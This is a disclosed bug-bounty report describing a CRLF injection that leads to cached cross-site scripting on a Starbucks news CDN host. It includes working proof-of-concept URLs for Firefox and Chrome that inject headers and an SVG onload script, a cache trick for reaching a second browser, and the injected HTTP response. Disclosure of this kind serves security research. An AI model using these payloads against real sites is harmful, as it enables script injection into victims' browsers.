# [newscdn.starbucks.com] CRLF Injection, XSS

## Report Details
- **Report ID**: 192749
- **URL**: https://hackerone.com/reports/192749
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2016-12-20T14:36:16.292Z
- **Disclosed**: 2017-03-09T03:31:53.889Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
**PoC (FireFox)**
```
http://newscdn.starbucks.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
```


After sending the request through FireFox this query is saved in cache and using a small trick can be made to work it in another browser.


**PoC (Chrome)**
Make sure you send this request after FireFox and previous http response contained the header X-Cache: HIT
```
http://newscdn.starbucks.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```


**HTTP Response**
```http
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: <https://news.starbucks.com/
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0
```

## Attachments
No attachments
